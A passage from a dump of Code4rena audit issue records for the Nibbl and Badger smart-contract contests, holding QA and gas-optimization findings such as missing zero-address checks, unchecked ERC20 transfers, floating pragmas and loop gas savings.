https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVaultFactory.sol https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Basket.sol  Recommended Mitigation Steps: Replace require statements with custom errors. ________________________________________________________________________  5. Title: Expression for `constant` values such as a call to `keccak256()`, should use `immutable` rather than `constant`  Proof of Concept: https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L51  Recommended Mitigation Steps: Change from `constant` to `immutable` reference: https://github.com/ethereum/solidity/issues/9232 ________________________________________________________________________  6. Title: `>=` is cheaper than `>`  Impact:  Strict inequalities (`>`) are more expensive than non-strict ones (`>=`). This is due to some supplementary checks (ISZERO, 3 gas)  Proof of Concept: https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L224  Recommended Mitigation Steps: Consider using `>=` instead of `>` to avoid some opcodes ________________________________________________________________________  7. Title: Using unchecked can save gas  Proof of Concept: https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L319  Recommended Mitigation Steps: using `unchecked` can save gas due to L#311  ________________________________________________________________________  8. Title: function sell(): L#378 should be unchecked due to L#373  Proof of Concept: https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L378  Recommended Mitigation Steps: Use `unchecked` ________________________________________________________________________  9. Title: Caching `length` for loop can save gas  Proof of Concept: https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L525 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L547  Recommended Mitigation Steps: Change to: ```     uint256 Length = _assets.length;      for (uint256 i = 0; i < Length; i++) { ``` ________________________________________________________________________  10. Title: Default value initialization  Impact: If a variable is not set/initialized, it is assumed to have the default value (0, false, 0x0 etc depending on the data type). Explicitly initializing it with its default value is an anti-pattern and wastes gas.  Proof of Concept: https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L525 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L547  Recommended Mitigation Steps: Remove explicit initialization for default values. ________________________________________________________________________  11. Title: Using unchecked and prefix increment is more effective for gas saving:  Proof of Concept: https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L525 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L547  Recommended Mitigation Steps: Change to: ```  for (uint i = 0; i < _assets.length;) {             // ...    unchecked { ++i; }          } ``` ________________________________________________________________________  12. Title: Consider make constant as private to save gas  Proof of Concept: https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Utilities/AccessControlMechanism.sol#L12-L14  Recommended Mitigation Steps: I suggest changing the visibility from `public` to `internal` or `private` ________________________________________________________________________  13. Title: Expression for `constant` values such as a call to `keccak256()`, should use `immutable` rather than `constant`  Proof of Concept: https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Utilities/AccessControlMechanism.sol#L12-L14 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Utilities/EIP712Base.sol#L7  Recommended Mitigation Steps: Change from `constant` to `immutable` reference: https://github.com/ethereum/solidity/issues/9232 ________________________________________________________________________"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/34", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "# Low  ## Obsolete pragma  The pragma version used is:  ``` pragma solidity 0.8.10; pragma solidity ^0.8.0; ```  But recently solidity released a new version with important Bugfixes:  - The first one is related to ABI-encoding nested arrays directly from calldata. You can find more information [here](https://blog.soliditylang.org/2022/05/17/calldata-reencode-size-check-bug/).  - The second bug is triggered in certain inheritance structures and can cause a memory pointer to be interpreted as a calldata pointer or vice-versa. We also have a dedicated blog [post](https://blog.soliditylang.org/2022/05/17/data-location-inheritance-bug/) about this bug.  Apart from these, there are several minor bug fixes and improvements.  The minimum required version should be [0.8.14](https://github.com/ethereum/solidity/releases/tag/v0.8.14)  ## Lack of empty address checks  The following methods have a lack checks if the received argument is an address, it's good practice in order to reduce human error to check that the address specified in the constructor or initialize is different than `address(0)`.  `address(0)`: - [NibblVaultFactory.sol#L26](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/NibblVaultFactory.sol#L26) - [AccessControlMechanism.sol#L19](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/Utilities/AccessControlMechanism.sol#L19)  ## AccessControl / Pausable  The contract `NibblVaultFactory` is `AccessControl` and `Pausable`, so the owner could resign while the contract is paused, causing a Denial of Service. Owner resignation while paused should be avoided.  Affected source code:  - [NibblVaultFactory.sol#L17](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/NibblVaultFactory.sol#L17)  ## Use `encode` instead of `encodePacked` for hashig  Use of `abi.encodePacked` in `NibblVaultFactory` is safe, but unnecessary and not recommended. `abi.encodePacked` can result in hash collisions when used with two dynamic arguments (string/bytes).  There is also discussion of removing `abi.encodePacked` from future versions of Solidity ([ethereum/solidity#11593](https://github.com/ethereum/solidity/issues/11593)), so using `abi.encode` now will ensure compatibility in the future.  Affected source code:  - [NibblVaultFactory.sol#L50](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/NibblVaultFactory.sol#L50) - [NibblVaultFactory.sol#L70-L71](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/NibblVaultFactory.sol#L70-L71) - [NibblVaultFactory.sol#L81](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/NibblVaultFactory.sol#L81) - [NibblVaultFactory.sol#L89-L91](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/NibblVaultFactory.sol#L89-L91)  ## Unsafe ERC20 calls  The following code doesn't check the result of the ERC20 calls. ERC20 standard specify that the token can return false if these calls fails, so it's mandatory to check the result of these ERC20 methods.  Reference:  - [eip-20](https://eips.ethereum.org/EIPS/eip-20)  > NOTES: > The following specifications use syntax from Solidity 0.4.17 (or above) Callers MUST handle false from returns (bool success). Callers MUST NOT assume that false is never returned!  Affected source code for `transfer`:  - [Basket.sol#L87](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/Basket.sol#L87) - [Basket.sol#L94](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/Basket.sol#L94) - [NibblVault.sol#L517](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/NibblVault.sol#L517) - [NibblVault.sol#L526](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/NibblVault.sol#L526)  ## Lack of ACK during owner change  It's possible to lose the ownership under specific circumstances.  Because an human error it's possible to set a new invalid owner. When you want to change the owner's address it's better to propose a new owner, and then accept this ownership with the new wallet.  Affected source code:  - [NibblVault.sol#L485](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/NibblVault.sol#L485)  # Non critical  ## Outdated packages  The packages used are out of date, it is good practice to use the latest version of these packages:  ``` \"@openzeppelin/contracts\": \"^4.5.0\", \"@openzeppelin/contracts-upgradeable\": \"^4.5.0\", ```  Affected source code:  - [package.json#L28-L29](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/package.json#L28-L29)  ## Use call to transfer ether  Because to transfer ether the `.transfer` method (which is capped at 2300 gas) is used instead of `.call` which is limited to the gas provided by the user.  If a contract that has a `fallback` method more expensive than 2300 gas, it will be impossible for a contract receive funds from `Basket` contract.  Reference:  - **transfer** -> The receiving smart contract should have a fallback function defined or else the transfer call will throw an error. There is a gas limit of 2300 gas, which is enough to complete the transfer operation. It is hardcoded to prevent reentrancy attacks. - **send** -> It works in a similar way as to transfer call and has a gas limit of 2300 gas as well. It returns the status as a boolean. - **call** -> It is the recommended way of sending ETH to a smart contract. The empty argument triggers the fallback function of the receiving address.  Affected source code:  - [Basket.sol#L80](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/Basket.sol#L80)  ## Use interval for update window  If a maximum of time is not used during the update proposal, it is possible that the update will be made at the beginning or during deploy it, and after a few years, the change will be accepted, and users won't be aware of that. It is convenient to use a maximum expiration time of the proposal.  Affected source code:  - [NibblVaultFactory.sol#L107](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/NibblVaultFactory.sol#L107) - [NibblVaultFactory.sol#L131](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/NibblVaultFactory.sol#L131) - [NibblVaultFactory.sol#L149](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/NibblVaultFactory.sol#L149) - [NibblVaultFactory.sol#L166](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/NibblVaultFactory.sol#L166)  ## Possible loss of token 0  Token `0` is more or less the owner of the `Basket` contract. If this token is transfered to the wrong address, for example `address(this)`, this ownership could be losed.   It would be convenient to block the `transfer` when the token is `0` and `to` is `address(this)` (*`address(0)` it's already checked.*).   Affected source code:  - [Basket.sol#L37-L54](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/Basket.sol#L37-L54)  ## Use abstract for base contracts  Abstract contracts are contracts that have at least one function without its implementation. **An instance of an abstract cannot be created.**  Reference:  - https://docs.soliditylang.org/en/v0.6.2/contracts.html#abstract-contracts  Affected source code:  - [Twav.sol#L4](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/Twav/Twav.sol#L4) - [EIP712Base.sol#L5](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/Utilities/EIP712Base.sol#L5) - [AccessControlMechanism.sol#L8](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/Utilities/AccessControlMechanism.sol#L8)  ## Wrong initialization  Wrong token name is used during the initialization of `NibblVault.INIT_EIP712`. `NibblVault` is used instead of `_tokenName`.  Affected source code:  - [NibblVault.sol#L186](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/NibblVault.sol#L186)  ## Lack of `lock` in `sell` method  if `buy` have `lock`, `sell` should have it, because the danger is the same.  Affected source code:  - [NibblVault.sol#L362](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/NibblVault.sol#L362) "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/32", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "# Use constants  Use constant instead of storage for:  - `UPDATE_TIME` in [NibblVaultFactoryData.sol#L6](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/Utilities/NibblVaultFactoryData.sol#L6)  Reduce math operations storing the value in a constant:  `2**32`: - [NibblVault.sol#L303](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/NibblVault.sol#L303) - [NibblVault.sol#L365](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/NibblVault.sol#L365)  # Use Custom Errors instead of Revert Strings to save Gas  Custom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met)  ### Source Custom Errors in Solidity:  Starting from Solidity v0.8.4, there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., revert(\"Insufficient funds.\");), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.  Custom errors are defined using the error statement, which can be used inside and outside of contracts (including interfaces and libraries).  **If it's not possible to use error codes due to the pragma used, it is recommended to reduce the strings to less than 32 bytes.**  Affected source code:  - [NibblVaultFactory.sol#L48-L49](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/NibblVaultFactory.sol#L48-L49) - [NibblVaultFactory.sol#L107](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/NibblVaultFactory.sol#L107)  # Avoid redundant code  Two methods are exposed in the abi for the same value.  `getTwavObservations` returns the same value as `public twavObservations`: - [Twav.sol#L44](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/Twav/Twav.sol#L44)  Remove `_defaultAdminRole` var and use `DEFAULT_ADMIN_ROLE`: - [AccessControlMechanism.sol#L20](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/Utilities/AccessControlMechanism.sol#L20)  There are no sense to have an unsafe version of `withdrawERC721Unsafe`: - [Basket.sol#L49-L56](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/Basket.sol#L49-L56)  # `++i` costs less gas compared to `i++` or `i += 1`  `++i` costs less gas compared to `i++` or `i += 1` for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.  `i++` increments `i` and returns the initial value of `i`. Which means:  ```solidity uint i = 1; i++; // == 1 but i == 2 ```  But `++i` returns the actual incremented value:  ```solidity uint i = 1; ++i; // == 2 and i == 2 too, so no need for a temporary variable ```  In the first case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2` I suggest using `++i` instead of `i++` to increment the value of an uint variable. Same thing for `--i` and `i--`  **It is also recommended to not initialize the counter variable and surround the increment with an `unchecked` region.**  Affected source code:  - [Basket.sol#L43](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/Basket.sol#L43) - [Basket.sol#L70](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/Basket.sol#L70) - [Basket.sol#L93](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/Basket.sol#L93) - [NibblVault.sol#L506](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/NibblVault.sol#L506) - [NibblVault.sol#L525](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/NibblVault.sol#L525) - [NibblVault.sol#L547](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/NibblVault.sol#L547)  # There's no need to set default values for variables.  If a variable is not set/initialized, the default value is assumed (0, `false`, 0x0 ... depending on the data type). You are simply wasting gas if you directly initialize it with its default value.  Affected source code:  - [Basket.sol#L43](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/Basket.sol#L43) - [Basket.sol#L70](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/Basket.sol#L70) - [Basket.sol#L93](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/Basket.sol#L93)  # Use the right type  Move `unlocked` close to an `address` type and change the value to be a boolean to share the same storage slot: - [NibblVault.sol#L126](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/NibblVault.sol#L126) "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/16", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "## missing checks for zero address  ### description Checking addresses against zero-address during initialization or during setting is a security best-practice. However, such checks are missing in address variable initializations/changes in many places.   Impact: Allowing zero-addresses will lead to contract reverts and force redeployments if there are no setters for such address variables.  ### findings  https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L23-L26   https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L100 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L124 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L159 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L487  ## no check for existing NFT  ### description  `_proxyVault` is pushed onto the array `nibbledTokens` without checking to see if an existing vault already exists for that NFT  this could result in multiple vaults created for the same NFT  https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L54  ## no support for cryptopunks  ### description  there appears to be no support for crytopunks, as they do not adhere to the ERC721 standard  ## Use of Block.timestamp  ### description   Block timestamps have historically been used for a variety of applications, such as entropy for random numbers (see the Entropy Illusion for further details), locking funds for periods of time, and various state-changing conditional statements that are time-dependent. Miners have the ability to adjust timestamps slightly, which can prove to be dangerous if block timestamps are used incorrectly in smart contracts.  ### recommendation  Block timestamps should not be used for entropy or generating random numbers\u2014i.e., they should not be the deciding factor (either directly or through some derivation) for winning a game or changing an important state.  Time-sensitive logic is sometimes required; e.g., for unlocking contracts (time-locking), completing an ICO after a few weeks, or enforcing expiry dates. It is sometimes recommended to use block.number and an average block time to estimate times; with a 10 second block time, 1 week equates to approximately, 60480 blocks. Thus, specifying a block number at which to change a contract state can be more secure, as miners are unable to easily manipulate the block number.  ### findings  https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L101 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L107 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L125 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L131 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L143 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L149 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L160 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L166 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L303 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L147  ## Unused receive() function  ### description  If the intention is for the Ether to be used, the function should call another function, otherwise it should revert  ### findings  https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L183 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L114 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Proxy/ProxyBasket.sol#L56 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Proxy/ProxyVault.sol#L56 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L585  ## transferFrom for ERC721  ### description  it is unsafe to use transferFrom for ERC721  https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L54  ## use safeTransfer for ERC20  use something like OpenZeppelin\u2019s safeTransfer/safeTransferFrom unless one is sure the given token reverts in case of a failure. Failure to do so will cause silent failures  https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L87 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L94  ## Unspecific Compiler Version Pragma  ### description  Avoid floating pragmas for non-library contracts.  While floating pragmas make sense for libraries to allow them to be included with multiple different versions of applications, it may be a security risk for application implementations.  A known vulnerable compiler version may accidentally be selected or security tools might fall-back to an older compiler version ending up checking a different EVM compilation that is ultimately deployed on the blockchain.  It is recommended to pin to a concrete compiler version.  ### findings  https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Utilities/AccessControlMechanism.sol#L4  ## No Transfer Ownership Pattern  ### description  Recommend considering implementing a two step process where the owner nominates an account and the nominated account needs to call an acceptCurator() function for the transfer of ownership to fully succeed. This ensures the nominated EOA account is a valid and active account.  ### findings  https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L485-L488 "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/15", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "## don't use && require statement  ### description  The code size on deployment can be a bit smaller to save gas  ### findings  https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L107 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L131 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L149 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L166  ## use calldata instead of memory  ### description  Use calldata instead of memory for function parameters saves gas if the function argument is only read.  ### findings  https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L41 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L68 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L91 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L504 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L523 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L545  ## for loop optimisations  ### description  Uninitialized variables are assigned with the types default value.  Explicitly initializing a variable with it's default value costs unnecessary  gas.  Suggest not initializing the for loop counter to 0.  An array\u2019s length should be cached to save gas in for-loops  Reading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.  Caching the array length in the stack saves around 3 gas per iteration.  Suggest storing the array\u2019s length in a variable before the for-loop, and use it instead:  ++i costs less gas compared to i++  ++i costs less gas compared to i++ for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration)  Suggest using ++i instead of i++ to increment the value of an uint variable.  Increments can be unchecked  In Solidity 0.8+, there\u2019s a default overflow check on unsigned integers. It\u2019s possible to uncheck this in for-loops and save some gas at each iteration, but at the cost of some code readability, as this uncheck cannot be made inline.  taking all of the above, the recommended format for gas savings is  ``` for (uint256 i; i < numIterations;) {    // ...    unchecked { ++i; }   }   ```  ### findings  https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L43 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L70 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L93 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L506 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L525 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L547  ## x = x + y is cheaper than x += y  https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L225"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-badger-findings/issues/141", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "valid"], "target": "2022-06-badger-findings", "body": "## Use bytes32 rather than string/bytes. ~300 gas (with optimization we spend 314 gas less while without it we spend 426 gas)  If you can fit your data in 32 bytes, then you should use bytes32 datatype rather than bytes or strings as it is much cheaper in solidity. Basically, Any fixed size variable in solidity is cheaper than variable size. [From the docs](https://docs.soliditylang.org/en/v0.5.8/types.html#bytes-and-strings-as-arrays), As a general rule, use bytes for arbitrary-length raw byte data and string for arbitrary-length string (UTF-8) data. If you can limit the length to a certain number of bytes, always use one of the value types bytes1 to bytes32 because they are much cheaper.  File: MyStrategy.sol [line 131-133](https://github.com/Badger-Finance/vested-aura/blob/d504684e4f9b56660a9e6c6dfb839dcebac3c174/contracts/MyStrategy.sol#L131-L133)  ```     function version() external pure returns (string memory) {         return \"1.0\";     } ```  **Tests for the above function** **Using strings** 21805 gas without optimization 21530 gas with optimization  **Using bytes32** 21379 gas without optimization 21216 gas with optimization  **Gas Estimates with optimization turned on**  ``` // 21530 gas     function version() external pure returns (string memory) {         return \"1.0\";     } // 21216 gas       function version() external pure returns (bytes32) {         return bytes32(\"1.0\");     } ```  ## ++i costs less gas compared to i++ or i += 1  (~5 gas per iteration)  ++i costs less gas compared to i++ or i += 1 for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.  i++ increments i and returns the initial value of i. Which means:  ``` uint i = 1;   i++; // == 1 but i == 2   ```  But ++i returns the actual incremented value:  ``` uint i = 1;   ++i; // == 2 and i == 2 too, so no need for a temporary variable   ```  In the first case, the compiler has to create a temporary variable (when used) for returning 1 instead of 2  Instances include:  File: MyStrategy.sol [line 118](https://github.com/Badger-Finance/vested-aura/blob/d504684e4f9b56660a9e6c6dfb839dcebac3c174/contracts/MyStrategy.sol#L118)  ```         for(uint i = 0; i < length; i++){ ```  Similar thing to my proposal was implemented in the following line  File: MyStrategy.sol [line 153](https://github.com/Badger-Finance/vested-aura/blob/d504684e4f9b56660a9e6c6dfb839dcebac3c174/contracts/MyStrategy.sol#L153)  ```         for (uint256 i; i < numRewards; ++i) { ```  **Other instances to modify** File: MyStrategy.sol [line 300](https://github.com/Badger-Finance/vested-aura/blob/d504684e4f9b56660a9e6c6dfb839dcebac3c174/contracts/MyStrategy.sol#L300) ```         for (uint256 i = 0; i < _claims.length; i++) { ```  File: MyStrategy.sol [line 317](https://github.com/Badger-Finance/vested-aura/blob/d504684e4f9b56660a9e6c6dfb839dcebac3c174/contracts/MyStrategy.sol#L317) ```         for (uint256 i = 0; i < _claims.length; i++) { ```   ## Splitting require() statements that use && saves gas - 8 gas per &&  Instead of using the && operator in a single require statement to check multiple conditions,using multiple require statements with 1 condition per require statement will save 8 GAS per && The gas difference would only be realized if the revert condition is realized(met).  File: MyStrategy.sol [line 184-187](https://github.com/Badger-Finance/vested-aura/blob/d504684e4f9b56660a9e6c6dfb839dcebac3c174/contracts/MyStrategy.sol#L184-L187)  ```         require(             balanceOfPool() == 0 && LOCKER.balanceOf(address(this)) == 0,             \"You have to wait for unlock or have to manually rebalance out of it\"         ); ```  The above should be modified to:  ```   require(balanceOfPool() == 0,\"You have to wait for unlock or have to manually rebalance out of it\" );     require(LOCKER.balanceOf(address(this)) == 0,\"You have to wait for unlock or have to manually rebalance out of it\"); ```  **Proof** **The following tests were carried out in remix with both optimization turned on and off**  ```function     require ( a > 1 && a < 5, \"Initialized\");     return  a + 2; } ```  **Execution cost** 21617 with optimization and using && 21976 without optimization and using &&  After splitting the require statement  ```function     require (a > 1 ,\"Initialized\");     require (a < 5 , \"Initialized\");     return a + 2; } ```  **Execution cost** 21609 with optimization and split require 21968 without optimization and using split require   ## Cache the length of arrays in loops ~6 gas per iteration Reading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.  The solidity compiler will always read the length of the array during each iteration. That is,     1.if it is a storage array, this is an extra sload operation (100 additional extra gas (EIP-2929 2) for 